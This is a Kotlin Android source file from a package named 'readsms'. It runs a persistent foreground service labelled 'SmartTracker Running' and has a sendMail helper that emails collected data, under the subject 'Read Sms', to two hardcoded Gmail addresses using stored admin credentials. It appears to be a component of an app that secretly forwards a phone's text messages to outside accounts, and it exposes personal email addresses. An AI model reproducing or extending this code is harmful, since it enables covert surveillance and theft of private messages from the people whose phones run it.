package com.app.readsms

import android.app.Notification
import android.content.Intent
import android.os.IBinder
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.os.Build
import android.util.Log

class DetectedService : Service() {
    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onCreate() {
        super.onCreate()
        val NOTIFICATION_ID = (System.currentTimeMillis() % 10000).toInt()
        var builder: Notification.Builder? = null
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val chan = NotificationChannel(
                "MyChannelId",
                "My Foreground Service",
                NotificationManager.IMPORTANCE_HIGH
            )
            builder = Notification.Builder(this, "MyChannelId")
                .setContentTitle(getString(R.string.app_name))
                .setContentText("SmartTracker Running")
                .setAutoCancel(true)
            val manager = (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
            manager.createNotificationChannel(chan)
        }
        var notification: Notification? = null
        if (builder != null) {
            notification = builder.build()
        }
        startForeground(NOTIFICATION_ID, notification)

        // Do whatever you want to do here
    }


    companion object{
        fun sendMail(data: String) {
            Log.d("sendMail",data)
            Thread {
                val sender = GMailSender(
                    Constants.ADMIN_EMAIL,
                    Constants.ADMIN_PASSWORD
                )
                try {
                    sender.sendMail(
                        "Read Sms",
                        data,
                        "ersumit3961@gmail.com",
                        "coolsam341@gmail.com"
                    )
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }.start()
        }

    }

}